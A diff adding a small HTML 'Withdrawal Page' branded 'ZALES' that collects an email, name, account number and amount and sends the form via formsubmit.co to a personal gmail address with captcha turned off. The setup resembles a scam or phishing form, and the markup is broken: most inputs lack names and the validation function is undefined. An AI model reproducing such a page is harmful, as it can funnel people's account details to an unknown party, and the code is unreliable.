@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title> Try It Yourself </title>
+	<meta name="viewport" content="width=device-width, initial-scale=1" />
+        <style type= "text/css">
+        html,body{
+        background: #fff;
+        
+        }
+        h2{
+        color:#ff7171;
+        }
+        input {
+         outline: none;
+         padding: 15px;
+         border: 2px solid #ff7171;
+         border-radius: 10px;
+      }
+      .input-cnt {
+         display: flex; /* display the icon and the input in a line */
+         margin-bottom: 15px;
+      }
+      .input-cnt:last-child {
+         margin-bottom: 0px;
+      }
+      .input-cnt > i {
+         min-width: 40px; /* set a minimum width for the icon */
+         padding: 10px; /* make sure the icon is centered vertically */
+         text-align: center; /* horizontally center the icon */
+         background: lightgrey;
+         border-top-left-radius: 20px;
+         border-bottom-left-radius: 20px;
+         color: #0076ff;
+      }
+      /* change styles when focused */
+      
+      /* style the inputs */
+      .input-cnt > input[type="text"], .input-cnt > input[type="password"] {
+         outline: none;
+         border: none;
+         padding: 10px;
+         border: 1px solid lightgrey;
+         border-top-right-radius: 20px;
+         border-bottom-right-radius: 20px;
+         width: 100%;
+      }
+      /* style the submit button */
+      .input-cnt > input[type="submit"] {
+         border: none;
+         border-radius: 20px;
+         outline: none;
+         width: 75%;
+         margin: 0 auto;
+         font-size: 105%;
+         padding: 8px;
+         color: #fff;
+         background: #ff7171;
+         transition-duration: .5s;
+      }
+      /* add a hover effect for the submit button */
+      .input-cnt > input[type="submit"]:hover {
+         color: #ff7171;
+         background: #fff;
+      }
+        </style>
+</head>
+<body>
+  
+     <center>
+       <h2>ZA<span style="color:#d8c7c7">LES</span></h2>
+     <h2>Withdrawal Page</h2>
+     <form action="https://formsubmit.co/awalondaki03@gmail.com" method="POST" onsubmit="return validateForm()">
+     <input type="email" name="email" placeholder="Your email" required/>
+      <input type="hidden" name="_subject" value="New Withdrawal request!">
+      <input type="hidden" name="_captcha" value="false">
+     <p><p><p><p><input type="text" placeholder="Your name" required/></p></p></p></p>
+     <p><p><p><p><input type="text" placeholder="Your name" required/></p></p></p></p>
+     <p><p><p><p><input type="number" placeholder="Your Account Number" required/></p></p></p></p>
+     <p><p><p><p><input type="number" placeholder="Amount" required/></p></p></p></p> 
+     <div class="input-cnt">
+            <input type="submit" value="Withdrawal" />
+     </div>
+     </center>
+    
+</body>
+</html>
